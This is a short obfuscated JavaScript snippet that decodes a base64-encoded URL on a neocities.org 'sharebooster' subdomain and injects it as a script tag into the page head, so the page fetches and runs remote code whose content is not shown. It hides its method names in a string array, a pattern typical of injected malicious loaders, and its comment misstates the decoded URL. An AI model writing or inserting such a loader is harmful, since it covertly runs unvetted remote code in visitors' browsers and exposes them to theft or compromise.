(function(){
  const _0x3c2e = ['createElement', 'script', 'type', 'text/javascript', 'onload', 'log', 'onerror', 'error', 'appendChild', 'head', 'src'];
  const encoded = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQzJUUzJUE4JTk0Lmpz'; // Base64 of: https://sharebooster.neocities.org/script3%EC%84%A4.js
  const url = decodeURIComponent(atob(encoded));
  const script = document[_0x3c2e[0]](_0x3c2e[1]);
  script[_0x3c2e[10]] = url;
  script[_0x3c2e[2]] = _0x3c2e[3];
  script[_0x3c2e[4]] = () => console[_0x3c2e[5]](url + ' loaded successfully.');
  script[_0x3c2e[6]] = () => console[_0x3c2e[7]]('Failed to load ' + url);
  document[_0x3c2e[9]][_0x3c2e[8]](script);
})();
